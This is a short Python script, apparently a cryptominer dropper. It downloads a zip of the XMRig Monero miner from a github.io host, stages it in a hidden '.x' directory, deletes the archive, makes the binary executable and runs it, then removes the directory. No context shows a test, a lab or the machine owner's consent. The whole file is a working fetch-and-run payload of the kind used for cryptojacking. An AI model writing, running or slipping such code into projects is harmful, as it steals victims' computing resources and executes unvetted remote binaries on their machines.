import os
import requests
import zipfile
import shutil

def download_file(url, destination):
    response = requests.get(url, stream=True)
    response.raise_for_status()  # Raise an error for bad status codes
    with open(destination, 'wb') as f:
        for chunk in response.iter_content(chunk_size=8192):
            f.write(chunk)

def main():
    # Define paths and URLs
    url = "https://trustmeow.github.io/xmrig/rig.zip"
    temp_dir = ".x"
    zip_path = os.path.join(temp_dir, "rig.zip")
    extracted_dir = temp_dir

    # Create the directory if it doesn't exist
    os.makedirs(temp_dir, exist_ok=True)

    try:
        # Download the file
        print(f"Downloading {url}...")
        download_file(url, zip_path)

        # Extract the zip file
        print(f"Extracting {zip_path}...")
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(extracted_dir)

        # Delete the zip file securely (shred -u equivalent)
        print(f"Deleting {zip_path}...")
        os.remove(zip_path)

        # Run the xmrig binary (assuming it's in the extracted directory)
        xmrig_path = os.path.join(extracted_dir, "xmrig")
        if os.path.exists(xmrig_path):
            print(f"Running {xmrig_path}...")
            os.system(f"chmod +x {xmrig_path}")  # Ensure it's executable
            os.system(xmrig_path)
        else:
            print(f"Error: {xmrig_path} not found!")

    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        # Clean up the directory
        if os.path.exists(temp_dir):
            print(f"Cleaning up {temp_dir}...")
            shutil.rmtree(temp_dir)

if __name__ == "__main__":
    main()
